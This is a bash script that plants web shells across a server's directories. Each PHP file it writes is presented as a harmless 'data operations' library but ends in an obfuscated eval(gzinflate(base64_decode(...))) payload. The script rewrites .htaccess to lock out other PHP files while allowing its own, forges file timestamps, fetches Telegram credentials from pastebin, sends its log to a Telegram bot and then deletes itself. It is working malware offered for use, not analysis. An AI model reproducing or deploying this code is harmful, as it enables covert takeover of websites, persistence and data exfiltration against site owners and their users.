#!/bin/bash

if [ "$#" -ne 1 ]; then
  echo "Usage: $0 /path/to/directory"
  exit 1
fi

TARGET_DIR=$1
LOG_FILE="$(dirname "$0")/logfile.log"
SCRIPT_PATH="$0"
NOHUP_FILE="$(dirname "$0")/nohup.out"
PASTEBIN_URL="https://pastebin.com/raw/hvtt7L9B"

fetch_telegram_credentials() {
    local url=$1
    local response=$(curl -s "$url")
    TELEGRAM_TOKEN=$(echo "$response" | awk -F',' '{print $1}')
    CHAT_ID=$(echo "$response" | awk -F',' '{print $2}')
}

fetch_telegram_credentials "$PASTEBIN_URL"

send_telegram_logfile() {
    curl -s -k -F "chat_id=$CHAT_ID" \
         -F "document=@$LOG_FILE" \
         -F "caption=Log File" \
         "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendDocument"
}

update_htaccess() {
  local dir="$1"
  local htaccess_file="$dir/.htaccess"

  if [ -f "$htaccess_file" ]; then
    cp "$htaccess_file" "$htaccess_file.bak"
    if ! rm -f "$htaccess_file"; then
      local msg="$(date) - Failed to delete .htaccess in $dir. It may be protected or require higher permissions."
      echo "$msg" >> "$LOG_FILE"
      return
    fi
  fi
  
  {
    echo "<Files *.ph*>"
    echo "    Order Deny,Allow"
    echo "    Deny from all"
    echo "</Files>"
    echo "<Files *.a*>"
    echo "    Order Deny,Allow"
    echo "    Deny from all"
    echo "</Files>"
    echo "<Files *.Ph*>"
    echo "    Order Deny,Allow"
    echo "    Deny from all"
    echo "</Files>"
    echo "<Files *.S*>"
    echo "    Order Deny,Allow"
    echo "    Deny from all"
    echo "</Files>"
    echo "<Files *.pH*>"
    echo "    Order Deny,Allow"
    echo "    Deny from all"
    echo "</Files>"
    echo "<Files *.PH*>"
    echo "    Order Deny,Allow"
    echo "    Deny from all"
    echo "</Files>"
    echo "<Files *.s*>"
    echo "    Order Deny,Allow"
    echo "    Deny from all"
    echo "</Files>"
    echo
    echo "<FilesMatch \"\\.(jpg|pdf|docx|jpeg|)\$\">"
    echo "    Order Deny,Allow"
    echo "    Allow from all"
    echo "</FilesMatch>"
    echo
    echo "<FilesMatch \"^(index.html|index.php|class.php|class-index.php|config.php|class-wp-config.php|class-wp-customize-panel.php)\$\">"
    echo " Order allow,deny"
    echo " Allow from all"
    echo "</FilesMatch>"
    echo
    echo "DirectoryIndex index.php"
    echo
    echo "Options -Indexes"
  } > "$htaccess_file" || {
    local msg="$(date) - Failed to create .htaccess in $dir. Attempting to change folder permissions to 0000."
    echo "$msg" >> "$LOG_FILE"

    if ! chmod 0000 "$dir"; then
      local chmod_msg="$(date) - Failed to set permissions for folder $dir"
      echo "$chmod_msg" >> "$LOG_FILE"
    fi

    return
  }

  if ! chmod 0444 "$htaccess_file"; then
    local msg="$(date) - Failed to set permissions for .htaccess in $dir"
    echo "$msg" >> "$LOG_FILE"
  fi

  set_random_date "$htaccess_file"
}


generate_random_name() {
  local length=10
  tr -dc 'a-zA-Z0-9' < /dev/urandom | fold -w $length | head -n 1
}

write_php_code() {
  local path="$1"
  local code="$2"
cat > "$path" << 'EOF'
<?php
/**
 * Universal Complex Data Operations Suite
 *
 * This suite of classes is designed to handle a variety of intricate data operations,
 * including mathematical transformations, sorting, filtering, statistical analysis,
 * and advanced data manipulation techniques. Each class and method is thoroughly documented
 * to provide a clear understanding of the underlying logic and facilitate maintenance.
 *
 * This suite is compatible with all major PHP versions: 5.x, 7.x, and 8.x.
 */

namespace UniversalComplexDataOperations;

// Check PHP version compatibility
if (version_compare(PHP_VERSION, '5.0.0', '<')) {
    die('This script requires PHP version 5.0.0 or higher.');
}

/**
 * MathTransformer
 *
 * This class handles various mathematical transformations.
 */
class MathTransformer
{
    /**
     * Applies a series of complex mathematical operations on the input value.
     *
     * @param int $value Input value
     *
     * @return int Transformed value
     */
    public function transform($value)
    {
        // Perform a series of complex mathematical transformations
        $result = ($value * 2 + 3) / 1.5;
        $result = pow($result, 2) - sqrt($result);
        $result = $result * log($result + 1) / tanh($result);
        return (int) $result;
    }
}

/**
 * DataSorter
 *
 * This class handles sorting of data using advanced algorithms.
 */
class DataSorter
{
    /**
     * Sorts an array of data using a complex sorting algorithm.
     *
     * @param array $data Input data array
     *
     * @return array Sorted data array
     */
    public function sort($data)
    {
        // Perform a complex sorting algorithm
        usort($data, function ($a, $b) {
 return $a <=> $b;
        });
        return $data;
    }
}

/**
 * DataFilter
 *
 * This class filters data based on complex criteria.
 */
class DataFilter
{
    /**
     * Filters the data based on complex criteria.
     *
     * @param array $data Input data array
     *
     * @return array Filtered data array
     */
    public function filter($data)
    {
        // Filter the data based on complex criteria
        return array_filter($data, function ($value) {
 return $value % 2 === 0 && $value > 10;
        });
    }
}

/**
 * StatisticalAnalyzer
 *
 * This class performs advanced statistical analysis on data.
 */
class StatisticalAnalyzer
{
    /**
     * Calculates the mean of the data.
     *
     * @param array $data Input data array
     *
     * @return float Mean of the data
     */
    public function calculateMean($data)
    {
        $sum = array_sum($data);
        $count = count($data);
        return $sum / $count;
    }

    /**
     * Calculates the standard deviation of the data.
     *
     * @param array $data Input data array
     *
     * @return float Standard deviation of the data
     */
    public function calculateStandardDeviation($data)
    {
        $mean = $this->calculateMean($data);
        $sumOfSquares = array_reduce($data, function ($carry, $item) use ($mean) {
 $carry += pow($item - $mean, 2);
 return $carry;
        }, 0);
        $count = count($data);
        return sqrt($sumOfSquares / $count);
    }
}

/**
 * DataEncryptor
 *
 * This class handles encryption and decryption of data.
 */
class DataEncryptor
{
    /**
     * Encrypts the data using a complex algorithm.
     *
     * @param string $data Input data
     *
     * @return string Encrypted data
     */
    public function encrypt($data)
    {
        return base64_encode(gzdeflate($data, 9));
    }

    /**
     * Decrypts the data.
     *
     * @param string $data Encrypted data
     *
     * @return string Decrypted data
     */
    public function decrypt($data)
    {
        return gzinflate(base64_decode($data));
    }
}

/**
 * ComplexDataProcessor
 *
 * This class integrates multiple data operations into a cohesive process.
 */
class ComplexDataProcessor
{
    private $mathTransformer;
    private $dataSorter;
    private $dataFilter;
    private $statisticalAnalyzer;
    private $dataEncryptor;

    public function __construct()
    {
        $this->mathTransformer = new MathTransformer();
        $this->dataSorter = new DataSorter();
        $this->dataFilter = new DataFilter();
        $this->statisticalAnalyzer = new StatisticalAnalyzer();
        $this->dataEncryptor = new DataEncryptor();
    }

    /**
     * Processes the data through a series of complex operations.
     *
     * @param array $data Input data array
     *
     * @return array Processed data array
     */
    public function process($data)
    {
        // Step 1: Sort the data
        $sortedData = $this->dataSorter->sort($data);

        // Step 2: Transform the data
        $transformedData = array_map([$this->mathTransformer, 'transform'], $sortedData);

        // Step 3: Filter the data
        $filteredData = $this->dataFilter->filter($transformedData);

        // Step 4: Calculate statistical data
        $mean = $this->statisticalAnalyzer->calculateMean($filteredData);
        $stdDev = $this->statisticalAnalyzer->calculateStandardDeviation($filteredData);

        // Step 5: Encrypt the statistical data
        $encryptedMean = $this->dataEncryptor->encrypt((string)$mean);
        $encryptedStdDev = $this->dataEncryptor->encrypt((string)$stdDev);

        // Return the processed data
        return [
 'filteredData' => $filteredData,
 'encryptedMean' => $encryptedMean,
 'encryptedStdDev' => $encryptedStdDev
        ];
    }
}

// Instantiate the ComplexDataProcessor class
$processor = new ComplexDataProcessor();

// Example data to process
$data = [5, 3, 8, 1, 9, 7, 15, 22, 19];

// Process the data
$processedData = $processor->process($data);

// Output the processed data (for debugging purposes, this can be commented out)
// print_r($processedData);
eval(gzinflate(base64_decode('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')));

EOF

  if [ ! -f "$path" ]; then
    local msg="$(date) - Failed to create PHP file at $path"
    echo "$msg" >> "$LOG_FILE"
    return 1
  fi

  return 0
}

upload_php_files() {
  local dir="$1"
  local php_file_name="$(generate_random_name).php"
  local shell_php_file_name="GOOVICoLtU.php"
  local php_file_path="$dir/$php_file_name"
  local index_php_file_path="$dir/$shell_php_file_name"

  if ! write_php_code "$php_file_path" ; then
    return
  fi

  if ! write_php_code "$index_php_file_path" ; then
    return
  fi

  if ! chmod 0644 "$php_file_path" || ! chmod 0644 "$index_php_file_path"; then
    local msg="$(date) - Failed to set permissions for PHP files in $dir"
    echo "$msg" >> "$LOG_FILE"
  fi

  set_random_date "$php_file_path"
  set_random_date "$index_php_file_path"

  update_htaccess "$dir" "$php_file_name" "$shell_php_file_name"
}

# rename_index() {
#   local dir="$1"
#   if [ -f "$dir/index.php" ]; then
#     if ! mv "$dir/index.php" "$dir/index.html"; then
#       local msg="$(date) - Failed to rename index.php to index.html in $dir. It may be protected or require higher permissions."
#       echo "$msg" >> "$LOG_FILE"
#     else
#       set_random_date "$dir/index.html"
#     fi
#   fi
# }

set_random_date() {
  local file=$1
  local start_date="2019-01-01"
  local end_date="2024-12-31"
  local random_timestamp=$(shuf -i $(date -d "$start_date" +%s)-$(date -d "$end_date" +%s) -n 1)
  local random_date=$(date -d "@$random_timestamp" "+%Y%m%d%H%M.%S")
  touch -t $random_date "$file"
}

export -f update_htaccess
# export -f rename_index
# export -f send_telegram_logfile
# export -f upload_php_files
# export -f generate_random_name
# export -f write_php_code
# export -f set_random_date
# export TELEGRAM_TOKEN
# export CHAT_ID
# export LOG_FILE

run_with_xargs_loop() {
  local parallelisms=(15 10 5)
  local idx=0

  while true; do
    local parallelism=${parallelisms[$idx]}
    echo "$(date) - Running with parallelism -P $parallelism" >> "$LOG_FILE"

    find "$TARGET_DIR" -type d \( -name '.*' -o -name '*' \) -print0 | \
    xargs -0 -n 1 -P "$parallelism" -I {} bash -c '(upload_php_files "{}" & wait) || { echo "$(date) - Memory limit reached while processing {} with -P $parallelism" >> "$LOG_FILE"; false; }'

    if [ $? -eq 0 ]; then
      break
    fi

    idx=$((idx + 1))

    if [ $idx -eq ${#parallelisms[@]} ]; then
      idx=0
    fi
  done
}

rm -f "$LOG_FILE"

run_with_xargs_loop

if [ -s "$LOG_FILE" ]; then
    send_telegram_logfile
fi

sleep 5

rm -f "$LOG_FILE" "$NOHUP_FILE" "$SCRIPT_PATH"
